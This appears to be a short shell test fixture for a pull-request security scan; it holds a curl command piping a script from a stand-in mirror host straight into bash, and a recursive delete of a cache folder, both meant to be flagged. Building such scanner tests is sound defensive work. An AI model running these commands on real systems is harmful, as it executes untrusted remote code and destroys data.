#!/bin/sh
# TEST FILE for the PR security scan (never merged): every line below should be flagged.
curl -fsSL https://unknown-mirror.example/install.sh | bash
rm -rf "$HOME/.cache/extra-life-test"
